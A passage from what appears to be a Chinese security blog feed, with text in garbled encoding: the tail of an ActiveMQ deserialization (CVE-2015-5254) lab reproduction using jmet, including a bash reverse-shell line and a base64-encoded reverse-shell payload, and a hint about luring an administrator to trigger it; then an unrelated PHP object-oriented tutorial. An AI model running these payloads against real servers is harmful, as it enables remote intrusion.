https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926225327978.png" alt="image-20210926225327978"></p><p>3.æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME   172.21.1.158   61616</span><br></pre></td></tr></table></figure><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926225452386.png" alt="image-20210926225452386"></p><p><img src="ActiveMQååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-5254ï¼‰å¤ç°.assets/image-20211019204943422.png" alt="image-20211019204943422"></p><p>å·¥ä½œç«¯å£ä¸ä¸€å®šæ˜¯é»˜è®¤61616ï¼Œç«¯å£å¯èƒ½éœ€è¦æ‰«ä¸‹</p><p><img src="ActiveMQååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2015-5254ï¼‰å¤ç°.assets/image-20211019205107418.png" alt="image-20211019205107418"></p><p>4.æ­¤æ—¶ä¼šç»™ç›®æ ‡çš„ActiveMQæ·»åŠ ä¸€ä¸ªåä¸ºäº‹ä»¶çš„é˜Ÿåˆ—ï¼Œå¯ä»¥æˆ‘ä»¬é€šè¿‡<a href="http://172.21.1.158:8161/admin/browse.jsp?JMSDestination=eventçœ‹åˆ°è¿™ä¸ªé˜Ÿåˆ—ä¸­æ‰€æœ‰æ¶ˆæ¯![image-20210926225536643](C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926225536643.png)" target="_blank" rel="noopener">http://172.21.1.158:8161/admin/browse.jsp?JMSDestination=eventçœ‹åˆ°è¿™ä¸ªé˜Ÿåˆ—ä¸­æ‰€æœ‰æ¶ˆæ¯![image-20210926225536643](C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926225536643.png)</a></p><p>5.ç‚¹å‡»æŸ¥çœ‹è¿™æ¡æ¶ˆæ¯å³å¯è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926225948303.png" alt="image-20210926225948303"></p><p>6.æ­¤æ—¶è¿›å…¥æ¼æ´å®¹å™¨ç¯å¢ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it  3174  /bin/bash</span><br></pre></td></tr></table></figure><p>7.å¯çœ‹åˆ°/ tmp /å·²æˆåŠŸåˆ›å»ºï¼Œè¯´æ˜æ¼æ´åˆ©ç”¨æˆåŠŸï¼š</p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230129073.png" alt="image-20210926230129073"></p><p>8.åå¼¹shell:</p><p>å°†å‘½ä»¤æ›¿æ¢æˆåå¼¹shellè¯­å¥å†åˆ©ç”¨ï¼š</p><p>å°†åå¼¹è¯­å¥bese64ç¼–ç ï¼š</p><p><a href="https://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p><blockquote><p>bash -i &gt;&amp; /dev/tcp/192.168.6.100/44444 0&gt;&amp;1</p></blockquote><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230232842.png" alt="image-20210926230232842"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMS41OC80NDU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.21.1.158 61616</span><br></pre></td></tr></table></figure><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230422867.png" alt="image-20210926230422867"></p><p>9.ç›‘å¬ç«¯å£:</p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230506125.png" alt="image-20210926230506125"></p><p>è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡Webç®¡ç†é¡µé¢è®¿é—®æ¶ˆæ¯å¹¶è§¦å‘æ¼æ´éœ€è¦ç®¡ç†å‘˜ç‰¹æƒã€‚åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¯±ä½¿ç®¡ç†å‘˜è®¿é—®æˆ‘ä»¬çš„é“¾æ¥ä»¥è¿›è¡Œè§¦å‘ï¼Œæˆ–è€…ä¼ªè£…æˆå…¶ä»–æœåŠ¡çš„åˆæ³•æ¶ˆæ¯åœ¨è§¦å‘æ—¶éœ€è¦ç­‰å¾…å®¢æˆ·ç«¯è®¿é—®ã€‚</p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230619005.png" alt="image-20210926230619005"></p><p><img src="C:\Users\allblue\AppData\Roaming\Typora\typora-user-images\image-20210926230701464.png" alt="image-20210926230701464"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpé¢å‘å¯¹è±¡é«˜çº§</title>
      <link href="/2021/07/25/php%E5%AD%A6%E4%B9%A0/2PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7/"/>
      <url>/2021/07/25/php%E5%AD%A6%E4%B9%A0/2PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7/</url>
      
        <content type="html"><![CDATA[<h4 id="è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"><a href="#è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ" class="headerlink" title="è½¬è½½è‡ªï¼šé»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ"></a>è½¬è½½è‡ªï¼š<a href="https://space.bilibili.com/434398031?spm_id_from=333.788.b_765f7570696e666f.1" target="_blank" rel="noopener">é»‘é©¬ç¨‹åºå‘˜æ­¦æ±‰ä¸­å¿ƒ</a></h4><h1 id="é¢å‘å¯¹è±¡é«˜çº§"><a href="#é¢å‘å¯¹è±¡é«˜çº§" class="headerlink" title="é¢å‘å¯¹è±¡é«˜çº§"></a><strong>é¢å‘å¯¹è±¡é«˜çº§</strong></h1><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šäº†è§£é¢å‘å¯¹è±¡çš„é«˜çº§ç‰¹æ€§ï¼ŒæŒæ¡phpä¸­é¢å‘å¯¹è±¡çš„é«˜çº§è¯­æ³•å’Œæ¦‚å¿µ</p></blockquote><ul><li>é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</li><li>phpç»§æ‰¿</li><li>æ¥å£</li><li>phpé‡è½½</li><li>traitä»£ç å¤ç”¨</li><li>å¯¹è±¡éå†</li></ul><h2 id="ä¸€ã€-é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§"><a href="#ä¸€ã€-é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§" class="headerlink" title="ä¸€ã€ é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§"></a><strong>ä¸€ã€ é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</strong></h2><blockquote><p>ç›®æ ‡ï¼šç†è§£é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§ï¼Œäº†è§£æ¯ç§ç‰¹æ€§å¸¦æ¥çš„æ•ˆæœå’Œä»·å€¼</p></blockquote><ul><li>å°è£…</li><li>ç»§æ‰¿</li><li>å¤šæ€</li></ul><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§</strong>ï¼šé¢å‘å¯¹è±¡æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œå…¶æœ¬è´¨æ˜¯ä»¥å»ºç«‹æ¨¡å‹ä½“ç°å‡ºæ¥çš„<strong>æŠ½è±¡æ€ç»´è¿‡ç¨‹</strong>å’Œ<strong>é¢å‘å¯¹è±¡çš„æ–¹æ³•</strong>ã€‚æ¨¡å‹æ˜¯ç”¨æ¥åæ˜ ç°å®ä¸–ç•Œä¸­äº‹ç‰©ç‰¹å¾çš„ã€‚</p><ul><li>é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³ä¸‰å¤§ç‰¹æ€§ï¼šå°è£…ã€ç»§æ‰¿ã€å¤šæ€</li><li>ä¸‰å¤§ç‰¹æ€§æ˜¯æŒ‡å¯¼é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ ¸å¿ƒæ€æƒ³</li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€å­¦ä¹ é¢å‘å¯¹è±¡ä¸‰å¤§ç‰¹æ€§çš„ç›®çš„æ˜¯ä¸ºäº†æ›´å¥½çš„ç†è§£é¢å‘å¯¹è±¡ç¼–ç¨‹æ€æƒ³</p><h3 id="1ã€å°è£…"><a href="#1ã€å°è£…" class="headerlink" title="1ã€å°è£…"></a><strong>1ã€å°è£…</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£å°è£…çš„æ¦‚å¿µï¼ŒæŒæ¡å°è£…çš„æ ¸å¿ƒç†è®ºï¼Œèƒ½å¤Ÿè¿ç”¨å°è£…ç‰¹æ€§æ¥æ”¯æŒé¢å‘å¯¹è±¡ç¼–ç¨‹</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å°è£…</strong>ï¼šå­—é¢æ„æ€å°±æ˜¯å°†å†…å®¹è£…åˆ°æŸä¸ªå®¹å™¨ä¸­ï¼Œå¹¶è¿›è¡Œå¯†å°ä¿å­˜ã€‚åœ¨é¢å‘å¯¹è±¡æ€æƒ³ä¸­ï¼Œå°è£…æŒ‡å°†<code>æ•°æ®</code>å’Œå¯¹<code>æ•°æ®çš„æ“ä½œ</code>æ†ç»‘åˆ°ä¸€èµ·ï¼Œå½¢æˆå¯¹å¤–ç•Œçš„éšè”½ï¼ŒåŒæ—¶å¯¹å¤–æä¾›å¯ä»¥æ“ä½œçš„<code>æ¥å£</code>ã€‚</p><ul><li><p>æ•°æ®ï¼šå³è¦æ“ä½œçš„æ•°æ®ï¼Œåœ¨é¢å‘å¯¹è±¡çš„å…·ä½“ä½“ç°å°±æ˜¯ç±»æˆå‘˜<strong>å±æ€§</strong>ï¼ˆå±æ€§å’Œé™æ€å±æ€§ï¼‰å’Œç±»å¸¸é‡ï¼Œè¿™äº›éƒ½æ˜¯åœ¨ç±»çš„å†…éƒ¨å®šä¹‰çš„ç”¨æ¥ä¿å­˜æ•°æ®çš„</p></li><li><p>æ•°æ®çš„æ“ä½œï¼šå³æ•°æ®åŠ å·¥è¿‡ç¨‹ï¼Œåœ¨é¢å‘å¯¹è±¡çš„å…·ä½“ä½“ç°å°±æ˜¯<strong>æ–¹æ³•</strong>ï¼Œå†…éƒ¨å®šä¹‰ä¸šåŠ¡é€»è¾‘å¯¹æ•°æ®è¿›è¡ŒåŠ å·¥å¤„ç†ã€‚</p></li><li><p>æ†ç»‘åˆ°ä¸€èµ·ï¼šå³ä½¿ç”¨ç±»ç»“æ„{}å°†å±æ€§ã€ç±»å¸¸é‡å’Œæ–¹æ³•å­˜æ”¾åˆ°ä¸€èµ·ï¼Œæˆä¸ºä¸€ä¸ªæ•´ä½“</p></li><li><p>å¯¹å¤–æä¾›å¯æ“ä½œçš„æ¥å£ï¼šå³æä¾›å¯ä»¥ä¾›å¤–éƒ¨è®¿é—®çš„ç±»æˆå‘˜ï¼ˆé€šå¸¸æ˜¯<strong>æ–¹æ³•</strong>ï¼‰</p></li></ul><blockquote><p>ç¤ºä¾‹</p></blockquote><p>å°è£…ç±»å¹¶ä½¿ç”¨</p><pre><code># å°è£…ç‰¹æ€§class Saler{                # æ†ç»‘å†…å®¹åˆ°ä¸€èµ·ï¼Œå½¢æˆå¯¹å¤–ç•Œéšè”½çš„æ•´ä½“    const ALLOW = true;    private static $count = 0;    private $money = 0;         # æ•°æ®ï¼šå±æ€§å’Œç±»å¸¸é‡ä¿å­˜    public function getMoney(){            # æ•°æ®æ“ä½œ        return $this-&gt;money;    }  }# å¤–éƒ¨$s = new Saler();$s-&gt;getMoney();                # å¤–éƒ¨åªèƒ½è®¿é—®ç±»ä¸­å…¬æœ‰çš„æ–¹æ³•ï¼Œå…·ä½“å®ç°ä¸å¯è§</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€å°è£…æ˜¯ä»å¯¹è±¡å®ä½“æŠ½è±¡å½¢æˆç±»çš„è¿‡ç¨‹</p><p>2ã€å°è£…çš„ç›®çš„æ˜¯è®©ä½¿ç”¨è€…åªçŸ¥é“ç±»èƒ½åšä»€ä¹ˆï¼Œè€Œä¸çŸ¥é“æ€ä¹ˆåšçš„</p><p>3ã€å°è£…ç‰¹æ€§ä¹Ÿæ˜ç¡®äº†ç±»ä¸å¯¹è±¡çš„èŒè´£ï¼šç±»è´Ÿè´£å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œå¯¹è±¡åªè¦è°ƒç”¨å®ç°</p><h3 id="2ã€ç»§æ‰¿"><a href="#2ã€ç»§æ‰¿" class="headerlink" title="2ã€ç»§æ‰¿"></a><strong>2ã€ç»§æ‰¿</strong></h3><blockquote><p>ç›®æ ‡ï¼šç†è§£ç»§æ‰¿çš„æ¦‚å¿µï¼ŒæŒæ¡ç»§æ‰¿æ¶æ„å¸¦æ¥çš„æ•ˆæœ</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>ç»§æ‰¿</strong>ï¼šinheritï¼Œå­ç±»åˆæ³•æ‹¥æœ‰çˆ¶ç±»æŸäº›æƒé™</p><ul><li>ç»§æ‰¿å¿…é¡»æ»¡è¶³ç»§æ‰¿å…³ç³»ï¼šå³å­˜åœ¨åˆç†çš„åŒ…å«å…³ç³»</li><li>ç»§æ‰¿çš„æœ¬è´¨æ˜¯å­ç±»é€šè¿‡ç»§æ‰¿å¯ä»¥ç›´æ¥ä½¿ç”¨çˆ¶ç±»å·²ç»å­˜åœ¨çš„æ•°æ®å’Œæ•°æ®æ“ä½œ</li><li>ä¸åŒç¼–ç¨‹è¯­è¨€çš„ç»§æ‰¿æœºåˆ¶å’Œæ–¹å¼ä¸ä¸€æ ·ï¼Œphpä¸­ä½¿ç”¨extendså…³é”®å­—è¡¨ç¤ºç»§æ‰¿</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€åˆ›å»ºçˆ¶ç±»ï¼šé€šå¸¸æ˜¯æ¯”è¾ƒæŠ½è±¡çš„ï¼Œå¤§æ¦‚çš„ç±»ï¼Œå®šä¹‰çš„æ–¹æ³•å’Œå±æ€§ä¹Ÿéƒ½æ˜¯æ¯”è¾ƒå¤§ä¼—çš„</p><p>2ã€åˆ›å»ºå­ç±»</p><ul><li>å­ç±»ä¸å·²æœ‰çˆ¶ç±»ä¹‹é—´å±äºåŒ…å«å…³ç³»ï¼šçˆ¶ç±»åŒ…å«å­ç±»</li><li>å­ç±»åˆ›å»ºæ—¶æ˜ç¡®ç»§æ‰¿çˆ¶ç±»ï¼šextends</li></ul><p>3ã€å®ä¾‹åŒ–å­ç±»å¯¹è±¡åï¼Œå­ç±»å¯¹è±¡å¯ä»¥ç›´æ¥è®¿é—®å­ç±»ä¸å­˜åœ¨è€Œçˆ¶ç±»å­˜åœ¨çš„å±æ€§å’Œæ–¹æ³•</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€ç»§æ‰¿çš„åŸºç¡€ï¼šå­ç±»ï¼ˆè¦ç»§æ‰¿å…¶ä»–ç±»çš„ç±»ï¼Œä¹Ÿç§°ä¹‹ä¸ºæ´¾ç”Ÿç±»ï¼‰ä¸çˆ¶ç±»ï¼ˆè¢«ç»§æ‰¿ç±»ï¼Œä¹Ÿç§°ä¹‹ä¸ºåŸºç±»ï¼‰ä¹‹é—´æœ¬èº«æ˜¯ä¸€ç§åŒ…å«äºè¢«åŒ…å«å…³ç³»ï¼Œå¦‚æ­¤æ‰æœ‰å¯ç»§æ‰¿çš„å‰æ</p><pre><code># å¤§ç±»class Human{}    # äººç±»# å°ç±»class Man{}class Woman{}    # å±äºäººç±»åŒ…å«çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç»§æ‰¿Human</code></pre><p>2ã€ç»§æ‰¿å…³é”®å­—ï¼šextendsï¼Œå­ç±»æƒ³è¦ç»§æ‰¿çˆ¶ç±»ï¼Œåˆ™å¿…é¡»åœ¨å­ç±»ç»“æ„ç”³æ˜æ—¶æ˜ç¡®ä½¿ç”¨extendså…³é”®å­—æ¥ç»§æ‰¿ç›¸å…³ç±»</p><pre><code># çˆ¶ç±»class Human{}    # äººç±»# å­ç±»class Man extends Human{}class Woman extends Human{}    # ç»§æ‰¿Humanç±»</code></pre><p>3ã€ç»§æ‰¿æ•ˆæœï¼šå­ç±»å¯ä»¥ä¸ç”¨è‡ªå·±å»å®ç°æŸäº›åŠŸèƒ½ï¼Œè€Œå¯ä»¥ç›´æ¥è®¿é—®çˆ¶ç±»ä¸­å·²ç»å­˜åœ¨çš„æˆå‘˜</p><pre><code># çˆ¶ç±»class Human{    public function eat(){        echo &apos;åƒé¥­&apos;;    }}# å­ç±»class Man extends Human{}            # å­ç±»ä¸ºç©ºç±»ï¼šæ²¡æœ‰ç±»æˆå‘˜# å®ä¾‹åŒ–å­ç±»å¯¹è±¡$m = new Man();$m-&gt;eat();                            # è¾“å‡ºåƒé¥­</code></pre><blockquote><p>å°ç»“</p></blockquote><p>1ã€ç»§æ‰¿extendsæ˜¯é¢å‘å¯¹è±¡æ€æƒ³ä¸­å®ç°ä»£ç é‡å¤åˆ©ç”¨çš„é‡è¦ç‰¹æ€§</p><p>2ã€ç»§æ‰¿æ˜¯æŒ‡å­ç±»å¯ä»¥ç›´æ¥è®¿é—®çˆ¶ç±»ä¸­å·²ç»å­˜åœ¨çš„æˆå‘˜</p><p>3ã€ç»§æ‰¿å¯ä»¥èŠ‚çœä»£ç å·¥ä½œï¼ŒåŒæ—¶å…è®¸å­ç±»ä¸­è¿›è¡Œæ‰©å±•ï¼Œå³åœ¨å­ç±»ä¸­å¢åŠ å¿…è¦çš„çˆ¶ç±»ä¸å­˜åœ¨çš„åŠŸèƒ½</p><h3 id="3ã€å¤šæ€"><a href="#3ã€å¤šæ€" class="headerlink" title="3ã€å¤šæ€"></a><strong>3ã€å¤šæ€</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£å¤šæ€çš„æ¦‚å¿µï¼Œç†è§£å¤šæ€çš„ä½œç”¨</p></blockquote><blockquote><p>æ¦‚å¿µ</p></blockquote><p><strong>å¤šæ€</strong>ï¼šå¤šæ€æ€§æ˜¯æŒ‡ç›¸åŒçš„æ“ä½œæˆ–å‡½æ•°ã€è¿‡ç¨‹å¯ä½œç”¨äºå¤šç§ç±»å‹çš„å¯¹è±¡ä¸Šå¹¶è·å¾—ä¸åŒçš„ç»“æœ</p><ul><li>éœ€è¦å‘ç”Ÿ<strong>ç±»çš„ç»§æ‰¿</strong>ï¼ŒåŒæ—¶å‡ºç°<strong>æ–¹æ³•çš„é‡å†™ï¼ˆoverrideï¼‰</strong>ï¼Œå³å­ç±»æ‹¥æœ‰ä¸çˆ¶ç±»åŒåçš„æ–¹æ³•</li><li>åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„æ—¶å€™è®©çˆ¶ç±»å¯¹è±¡æŒ‡å‘å­ç±»å¯¹è±¡ï¼ˆå¼ºåˆ¶ç±»å‹ï¼Œphpä¸æ”¯æŒï¼‰</li><li>ç»“æœï¼šçˆ¶ç±»å¯¹è±¡è¡¨ç°çš„å­ç±»å¯¹è±¡çš„ç‰¹ç‚¹</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€æ˜ç¡®ç»§æ‰¿å…³ç³»ï¼šå­ç±»ç»§æ‰¿çˆ¶ç±»</p><p>2ã€å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•</p><p>3ã€å®ä¾‹åŒ–å­ç±»ï¼Œä½†æ˜¯å­˜å‚¨å­ç±»å¯¹è±¡çš„æ•°æ®ç±»å‹ä¸ºçˆ¶ç±»å¯¹è±¡</p><p>4ã€å®ç°ï¼šçˆ¶ç±»å¯¹è±¡è¡¨ç°å‡ºå­ç±»å¯¹è±¡çš„å½¢æ€</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€å¤šæ€éœ€è¦å¼ºç±»å‹è¯­è¨€ï¼Œä»¥Javaä¸ºä¾‹</p><pre><code>// çˆ¶ç±»class Animal{    public void show(){         System.out.println(&quot;Animal&quot;);    }}// å­ç±»class Dog extends Animal{    // é‡å†™showæ–¹æ³•    public void show(){         System.out.println(&quot;Dog&quot;);    }}// å®ä¾‹åŒ–ï¼šJavaæ˜¯å¼ºç±»å‹ï¼Œå¿…é¡»æŒ‡å®šä¿å­˜æ•°æ®çš„å˜é‡çš„ç±»å‹Animal a = new Doc();     // çˆ¶ç±»å¯¹è±¡æŒ‡å‘å­ç±»å¯¹è±¡ç©ºé—´ï¼šaä¸ºçˆ¶ç±»å½¢æ€a.show();                 // æ‰“å°Dogï¼Œçˆ¶ç±»å¯¹è±¡è°ƒç”¨çš„æ˜¯å­ç±»æ–¹æ³•ï¼šaè¡¨ç°å‡ºå­ç±»å½¢æ€</code></pre><p>2ã€phpæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å˜é‡çš„å¼ºåˆ¶ç±»å‹ï¼Œå› æ­¤phpä¸æ”¯æŒå¤šæ€ã€‚ä½†æ˜¯phpå¯ä»¥æ¨¡æ‹Ÿå¤šæ€</p><ul><li>å¤šç§å­ç±»ç»§æ‰¿çˆ¶ç±»</li><li>å­ç±»é‡å†™çˆ¶ç±»æ–¹æ³•</li><li><p>çˆ¶ç±»å®šä¹‰æ–¹æ³•å®ç°ç»Ÿä¸€é‡å†™æ–¹æ³•è°ƒç”¨</p><h1 id="çˆ¶ç±»"><a href="#çˆ¶ç±»" class="headerlink" title="çˆ¶ç±»"></a>çˆ¶ç±»</h1><p>class Animal{</p><pre><code># ç»Ÿä¸€è°ƒç”¨è¢«é‡å†™æ–¹æ³•public static function show(Animal $obj){        # Animal $objï¼Œå¼ºåˆ¶å¯¹è±¡ä¸ºAnimalå¯¹è±¡ï¼ˆå­ç±»å¯¹è±¡ä¹Ÿå¯ä»¥ï¼‰    # å¯¹è±¡åŠ¨æ€è°ƒç”¨æ–¹æ³•    $obj-&gt;display();}# çˆ¶ç±»æ–¹æ³•public function display(){    echo &apos;Animal&apos;;}</code></pre><p>}</p><h1 id="å­ç±»1"><a href="#å­ç±»1" class="headerlink" title="å­ç±»1"></a>å­ç±»1</h1><p>class Cat extends Animal{</p><pre><code># é‡å†™çˆ¶ç±»æ–¹æ³•public function display(){    echo &apos;cat&apos;;}</code></pre><p>}</p><h1 id="å­ç±»2"><a href="#å­ç±»2" class="headerlink" title="å­ç±»2"></a>å­ç±»2</h1><p>class Dog extends Animal{</p><pre><code>public function display(){    echo &apos;dog&apos;;}</code></pre><p>}</p><h1 id="çˆ¶ç±»æ–¹æ³•ç»Ÿä¸€è°ƒç”¨ï¼šä¼ å…¥ä¸åŒçš„å¯¹è±¡"><a href="#çˆ¶ç±»æ–¹æ³•ç»Ÿä¸€è°ƒç”¨ï¼šä¼ å…¥ä¸åŒçš„å¯¹è±¡" class="headerlink" title="çˆ¶ç±»æ–¹æ³•ç»Ÿä¸€è°ƒç”¨ï¼šä¼ å…¥ä¸åŒçš„å¯¹è±¡"></a>çˆ¶ç±»æ–¹æ³•ç»Ÿä¸€è°ƒç”¨ï¼šä¼ å…¥ä¸åŒçš„å¯¹è±¡</h1><p>Animal::show(new Cat());        # è¾“å‡ºcat<br>Animal::show(new Dog());        # è¾“å‡ºdog</p></li></ul><blockquote><p>å°ç»“</p></blockquote><p>1ã€å¤šæ€çš„å‘ç”Ÿå¿…é¡»æ˜¯æœ‰ç»§æ‰¿å…³ç³»ï¼Œå¹¶ä¸”å­ç±»è¦é‡å†™çˆ¶ç±»æ–¹æ³•</p><p>2ã€å¤šæ€æ˜¯æŒ‡çˆ¶ç±»å¯¹è±¡æ‹¥æœ‰å­ç±»å½¢æ€ï¼Œå¹¶ä¸”å¯ä»¥è¡¨ç°å‡ºå­ç±»çš„ç‰¹æ€§ï¼ˆè°ƒç”¨å­ç±»æ–¹æ³•ï¼‰</p><p>3ã€phpæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œä¸æ”¯æŒå¤šæ€</p><h2 id="äºŒã€-phpç»§æ‰¿"><a href="#äºŒã€-phpç»§æ‰¿" class="headerlink" title="äºŒã€ phpç»§æ‰¿"></a><strong>äºŒã€ phpç»§æ‰¿</strong></h2><blockquote><p>å­¦ä¹ ç›®æ ‡ï¼šæŒæ¡phpä¸­ç»§æ‰¿çš„å®ç°ï¼Œç†è§£phpç»§æ‰¿ä¸­çš„è¯¸å¤šç‰¹æ€§ï¼Œèƒ½å¤Ÿä½¿ç”¨ç»§æ‰¿æ¥å®ç°å¤§å‹é¡¹ç›®æ¶æ„</p></blockquote><ul><li>ç»§æ‰¿è¯­æ³•</li><li>é‡å†™</li><li>parentå…³é”®å­—</li><li>phpç»§æ‰¿ç‰¹ç‚¹</li><li>é™æ€å»¶è¿Ÿç»‘å®š</li><li>æœ€ç»ˆç±»</li><li>æŠ½è±¡ç±»</li></ul><h3 id="1ã€ç»§æ‰¿ç›¸å…³æ¦‚å¿µå’Œå®ç°"><a href="#1ã€ç»§æ‰¿ç›¸å…³æ¦‚å¿µå’Œå®ç°" class="headerlink" title="1ã€ç»§æ‰¿ç›¸å…³æ¦‚å¿µå’Œå®ç°"></a><strong>1ã€ç»§æ‰¿ç›¸å…³æ¦‚å¿µå’Œå®ç°</strong></h3><blockquote><p>ç›®æ ‡ï¼šäº†è§£phpç»§æ‰¿ä¸­ç›¸å…³çš„å…³é”®å­—ï¼Œå®ç°phpä¸­çš„ç»§æ‰¿</p></blockquote><blockquote><p><strong>æ¦‚å¿µ</strong></p></blockquote><p><strong>ç»§æ‰¿</strong>ï¼šextendsï¼Œæ˜¯æŒ‡å­ç±»é€šè¿‡ç»§æ‰¿å¯ä»¥<strong>è®¿é—®çˆ¶ç±»çš„æˆå‘˜</strong></p><ul><li>çˆ¶ç±»ï¼šä¹Ÿå«åŸºç±»ï¼Œæ˜¯è¾ƒå¤§çš„åˆ†ç±»</li><li>å­ç±»ï¼šä¹Ÿå«æ´¾ç”Ÿç±»ï¼Œæ¯”çˆ¶ç±»çš„åˆ†ç±»è¦å°</li></ul><blockquote><p>æ­¥éª¤</p></blockquote><p>1ã€æ ¹æ®éœ€æ±‚å…ˆæŠ½è±¡å‡ºçˆ¶ç±»</p><p>2ã€æ ¹æ®éœ€æ±‚ç¡®å®šå­ç±»ï¼Œå¹¶å®ç°ç»§æ‰¿</p><blockquote><p>ç¤ºä¾‹</p></blockquote><p>1ã€ç»§æ‰¿åŸºæœ¬è¯­æ³•ï¼šclass å­ç±» extends çˆ¶ç±»{}</p><pre><code># çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰ï¼šäººç±»æ˜¯è¾ƒå¤§ç±»ï¼Œæ‰€æœ‰äººéƒ½å±äºäººç±»class Human{}# å­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ï¼šå°äºäººç±»ï¼Œå¹¶ä¸”è¾“å…¥äººç±»class Man extends Human{}</code></pre><p>2ã€ç»§æ‰¿æ•ˆæœï¼šçˆ¶ç±»è¢«ç»§æ‰¿çš„å†…å®¹ï¼Œå¯ä»¥é€šè¿‡å­ç±»å¯¹è±¡è¿›è¡Œè®¿é—®ï¼ˆåªèƒ½æ˜¯å­ç±»å¯¹è±¡ï¼‰</p><pre><code># çˆ¶ç±»ï¼ˆåŸºç±»ï¼‰class Human{    public function showName(){        echo __CLASS__;        # ä»£è¡¨å½“å‰æ‰€åœ¨ç±»å    }}# å­ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰class Man extends Human{}# å®ä¾‹åŒ–å­ç±»å¯¹è±¡ï¼šå¦‚æœå®ä¾‹åŒ–çˆ¶ç±»å¯¹è±¡Humanï¼Œé‚£ä¹ˆä¸å­ç±»å’Œç»§æ‰¿æ¯«æ— å…³ç³»$m = new Man();$m-&gt;showName();                # è®¿é—®ç»§æ‰¿è‡ªçˆ¶ç±»çš„æ–¹æ³•ï¼šè¾“å‡ºHuman</code></pre><p>3ã€ç»§æ‰¿ç›®æ ‡ï¼šç»§æ‰¿æœ¬è´¨æ˜¯é’ˆå¯¹åŒç±»æœ‰åŒ…å«å…³ç³»çš„å…±æ€§ç»§æ‰¿ï¼Œå³çˆ¶ç±»é€šå¸¸æ˜¯åŒ…å«å­ç±»ï¼Œå­ç±»å±äºçˆ¶ç±»ã€‚æ‰€ä»¥åœ¨çˆ¶ç±»ä¸­é€šå¸¸å®šä¹‰çš„æ˜¯å­ç±»å…±æœ‰çš„ä¸€äº›ç‰¹æ€§æˆå‘˜ï¼Œè¿™æ˜¯å¼€å‘è€…é»˜è®¤éµå¾ªçš„è§„åˆ™</p><pre><code>class Animal{}class Man extends Animal{}        # 